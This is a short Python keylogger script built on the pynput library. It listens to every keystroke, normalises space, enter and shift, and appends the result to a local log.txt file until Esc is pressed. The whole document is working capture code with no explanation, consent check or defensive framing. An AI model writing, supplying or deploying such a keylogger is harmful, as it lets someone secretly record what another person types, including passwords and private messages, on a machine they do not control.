from pynput.keyboard import Key, Listener

def on_press(key):
    
    key = str(key).replace("'", "")
    
    
    if key == 'Key.space':
        key = " "
    elif key == 'Key.shift_r':
        key = ""
    elif key == 'Key.shift':
        key = ""
    elif key == 'Key.enter':
        key = "\n"
    with open("log.txt","a") as f:
        f.write(key)
    if key == 'Key.esc':
        listener.stop()
        exit()
     

def on_release():
    pass

with Listener(on_press=on_press) as listener:
    listener.join()